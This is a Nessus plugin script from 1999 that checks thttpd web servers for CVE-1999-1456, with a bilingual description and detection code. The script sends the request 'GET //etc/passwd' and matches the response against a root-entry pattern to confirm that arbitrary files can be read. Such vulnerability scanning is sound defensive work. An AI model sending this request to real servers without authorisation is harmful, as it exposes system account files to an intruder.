#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10286);
 script_version ("$Revision: 1.23 $");
 script_cve_id("CVE-1999-1456");
 
 name["english"] = "thttpd flaw";
 name["francais"] = "Problème de thttpd";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The remote HTTP server allows an attacker to read arbitrary files
on the remote web server, simply by adding a slash in front of its name. 
Example:
	GET //etc/passwd 

will return /etc/passwd.

Solution : upgrade your web server or change it.
Risk factor : High";

 desc["francais"] = "Le serveur HTTP distant
permet à un pirate de lire des fichiers
arbitraires, en rajoutant simplement un
slash au début de son nom.
Exemple :
	GET //etc/passwd
	
retournera /etc/passwd.

Solution : Mettez à jour votre server web ou changez-le.
Facteur de risque : sérieux";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "thttpd flaw";
 summary["francais"] = "Trou de sécurité de thttpd";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Remote file access";
 family["francais"] = "Accès aux fichiers distants";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! port ) exit(0);


if(get_port_state(port))
{
  buf = http_get(item:"//etc/passwd", port:port);
  rep = http_keepalive_send_recv(port:port, data:buf);
  if ( ! rep ) exit(0);
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:rep))security_hole(port);
}
